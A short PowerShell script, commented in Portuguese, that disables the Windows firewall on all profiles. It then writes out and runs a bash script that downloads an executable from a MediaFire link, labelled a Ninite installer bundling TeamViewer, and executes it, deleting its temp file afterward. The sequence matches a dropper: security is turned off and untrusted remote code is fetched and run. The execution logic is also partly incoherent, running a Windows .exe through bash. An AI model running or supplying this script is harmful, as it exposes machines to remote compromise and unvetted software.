# Desabilitar o firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Baixar e executar o arquivo Bash
$bashScript = @'
#!/bin/bash

url="https://download1980.mediafire.com/v08oehm7j8ogERS_wDNyD_VamvX45brTGrJhWWNj-HY1HMkcohKu2BjnFa6BCuN2uCBniqJWWlFbZoWNCYGKhoF7lq_8ZYizWuyPZANEnS0jEi3mE7A5i1cNeOtG0z9-fqv8aym19i8-9XmnlQze50oXa3EyxHp8WEF41ufh3gE/06hlixmv22padaq/Ninite+FileZilla+Notepad+TeamViewer+15+Installer.exe"
output_file="Installer.exe"

curl -L -o "$output_file" "$url"

if [ $? -eq 0 ]; then
  echo "Download concluído."
else
  echo "Falha ao baixar o arquivo."
  exit 1
fi

chmod +x "$output_file"
./"$output_file"
'@

# Salvar o código Bash em um arquivo temporário
$bashScriptFile = [IO.Path]::GetTempFileName() + ".sh"
$bashScript | Out-File -FilePath $bashScriptFile -Encoding ASCII

# Executar o script Bash
Start-Process -Wait -NoNewWindow bash -ArgumentList "-c '$bashScriptFile'"

# Remover o arquivo temporário do script Bash
Remove-Item -Path $bashScriptFile
